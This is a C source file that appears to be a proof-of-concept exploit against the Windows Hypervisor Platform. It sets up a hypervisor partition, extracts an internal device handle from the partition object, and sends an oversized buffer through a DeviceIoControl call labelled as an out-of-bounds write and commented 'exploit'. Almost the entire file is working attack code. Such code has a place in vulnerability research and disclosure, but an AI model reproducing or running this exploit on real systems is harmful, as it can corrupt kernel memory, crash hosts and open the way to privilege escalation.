#include <stdio.h>
#include <Windows.h>
#include "WinHvPlatform.h"

#define OOB_WRITE_CTL_CODE 0x221268
#define OOB_SIZE 0x10000

int
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	unsigned int size, val;
	char* payload = NULL;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &cap, sizeof(cap), &size);

	if (cap.HypervisorPresent == 0)
	{
		printf("Hypervisor is not present\n");
		return -1;
	}

	WHvCreatePartition(&prtn);

	val = 1;//processor cnt
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &val, sizeof(val));

	WHvSetupPartition(prtn);

	HANDLE VidExo = (HANDLE)(*((__int64*)prtn + 1) & 0xfffffffffffffffe);

	payload = malloc(OOB_SIZE);
	memset(payload, 0x0, OOB_SIZE);

	//exploit
	DeviceIoControl(VidExo, OOB_WRITE_CTL_CODE, payload, OOB_SIZE, NULL, 0, NULL, NULL);

	printf("%p\n", VidExo);

	getc(stdin);

	WHvDeletePartition(prtn);
}